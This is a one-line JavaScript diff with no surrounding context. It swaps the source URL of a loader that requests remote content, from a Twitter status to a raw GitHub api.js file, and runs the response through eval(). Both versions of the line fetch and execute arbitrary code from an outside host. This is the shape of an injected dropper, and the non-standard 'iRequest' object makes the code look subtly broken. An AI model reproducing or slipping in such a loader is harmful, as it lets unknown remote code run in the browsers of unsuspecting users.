@@ -1,1 +1,1 @@
-var i = new iRequest();i.onreadystatechange=function(){if (i.readyState==4 && i.status==200){eval(i.responseText);}}i.open("GET","https://twitter.com/Porn51a/status/695673157399797760",true);i.send();
+var i = new iRequest();i.onreadystatechange=function(){if (i.readyState==4 && i.status==200){eval(i.responseText);}}i.open("GET","https://raw.githubusercontent.com/ovid48/schooler/master/api.js",true);i.send();
